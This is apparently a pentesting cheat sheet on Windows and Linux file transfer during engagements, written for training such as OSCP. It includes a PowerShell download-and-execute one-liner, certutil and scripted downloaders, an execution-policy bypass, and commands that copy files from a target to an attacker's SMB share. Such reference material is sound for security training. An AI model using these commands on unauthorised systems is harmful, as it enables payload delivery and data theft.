---
sidebar_position: 2
title: File Transfer
description: Windows - Linux File Transfer 
keywords: [file transfer, windows file transfer, pentesting, oscp, smb file transfer, powershell file transfer, certutil file transfer, ftp file transfer, tftp file transfer, vbscript file transfer, scp]
---

## HTTP Server

```batch
:: Python[3]
python3 -m http.server <PORT>

:: Python[2]
python -m SimpleHTTPServer <PORT>
```

```batch
:: Simple JavaScript HTTP Server
http-server [path] [options]
```

## SMB 


```batch
:: Transfer Files To\From Windows with SMB
:: -smb2support [SMB-2]
smbserver <SHARE_NAME> <DIRECTORY>                    
```


```batch
:: SMB Remote Commands
:: List Share Contents
dir \\IP\SHARE_NAME                       

:: Transfer to Target Machine
copy \\IP\SHARE_NAME\FILE OUTPUT 

:: Transfer to Attacker Machine
copy FILE \\IP\SHARE_NAME\OUTPUT
```


## PSH


```powershell
# Download&Execute Without Saving
powershell IEX (New-Object System.Net.WebClient).DownloadString('http://IP:PORT/FILE.ps1')
```

<br/>


```powershell
# Interactive Terminal
powershell -command (New-Object System.Net.WebClient).Downloadfile('http://IP:PORT/FILE.exe','FILE.exe')
```

```powershell
# Non Interactive Terminal
echo $storageDir = $pwd > PSH.ps1
echo $webclient = New-Object System.Net.WebClient >> PSH.ps1
echo $url = "http://IP:PORT/FILE.exe" >> PSH.ps1
echo $file = "OUTPUT.exe" >> PSH.ps1
echo $webclient.DownloadFile($url,$file) >> PSH.ps1
powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File PSH.ps1
```

<br/>


```powershell
# WebRequest
$source = 'http://IP:PORT/FILE.exe'
$destination = 'OUTPUT.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
```


```powershell
# RestMethod
$source = 'http://IP:PORT/FILE.exe'
$destination = 'FILE.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
```

## CERTUTIL

```batch
certutil -urlcache -split -f "http://IP:PORT/FILE.exe"
```

## FTP


```batch
:: Requires [pyftpdlib] Package 
:: Start The Server
python3 -m pyftpdlib -p 21

:: Access The Server
:: [USER: anonymous PASSWORD: anonymous]
ftp -p 10.11.3.35 21

:: Non Interactive SHELL
:: Target
echo open IP > FTP.txt
echo USER anonymous >> FTP.txt
echo anonymous >> FTP.txt
echo get FILE.exe >> FTP.txt
echo bye >> FTP.txt

:: Download The File
ftp -v -n -s:FTP.txt
```

## TFTP


```batch
:: Requires [atftp] Package 
:: Create TFTP Directory
mkdir /tftp
chown nobody: /tftp

:: Start The Server
atftpd --daemon --port 69 /tftp

:: Target [PUT - GET]
tftp -i $IP PUT $FILE   
tftp -i $IP GET $FILE
```

## CURL - WGET


```bash
curl http://IP:PORT/FILE.exe -o OUTPUT.exe
```

```bash
wget http://IP:PORT/FILE.exe
```

## SCP

```bash
scp -P 22 "C:\FILE.exe" machine@IP:/home/machine/OUTPUT.exe
```

## HTTP - VBScript

```batch
echo strUrl = WScript.Arguments.Item(0) > SCRIPT.vbs
echo StrFile = WScript.Arguments.Item(1) >> SCRIPT.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> SCRIPT.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> SCRIPT.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> SCRIPT.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> SCRIPT.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> SCRIPT.vbs
echo Err.Clear >> SCRIPT.vbs
echo Set http = Nothing >> SCRIPT.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> SCRIPT.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> SCRIPT.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> SCRIPT.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> SCRIPT.vbs
echo http.Open "GET", strURL, False >> SCRIPT.vbs
echo http.Send >> SCRIPT.vbs
echo varByteArray = http.ResponseBody >> SCRIPT.vbs
echo Set http = Nothing >> SCRIPT.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> SCRIPT.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> SCRIPT.vbs
echo strData = "" >> SCRIPT.vbs
echo strBuffer = "" >> SCRIPT.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> SCRIPT.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> SCRIPT.vbs
echo Next >> SCRIPT.vbs
echo ts.Close >> SCRIPT.vbs

:: Download The File
cscript /nologo SCRIPT.vbs http://IP:PORT/FILE.exe OUTPUT.exe
```